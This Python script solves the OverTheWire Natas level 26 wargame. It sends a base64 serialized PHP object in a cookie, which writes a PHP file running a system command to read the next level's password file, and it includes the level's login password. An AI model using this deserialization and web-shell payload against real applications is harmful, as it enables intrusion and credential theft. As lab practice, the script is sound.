import requests

username = "natas26"
password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
drawing_url = url + "?x1=0&y1=0&x2=400&y2=400"
response = session.get(drawing_url, auth=(username, password))
print(session.cookies)
print(session.cookies["drawing"])

# Navigate to natas26decode.php to view the decoded data

print()
print("=" * 20, "AFTER CHANGING THE DRAWING COOKIE", "=" * 20)
print()

# Now we generate a malicious data from the modified Logger code in natas26.php and store it in the drawing cookie
session.cookies["drawing"] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2hhY2tlZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="
# Try to get the response again after submitting malicious code
response = session.get(drawing_url, auth=(username, password))
content = response.text
# Check the cookies
print(session.cookies)
# print(content)

# Navigate to where the log file is stored at
password_url = url + "img/hacked.php"
response = session.get(password_url, auth=(username, password))
content = response.text
print(content)
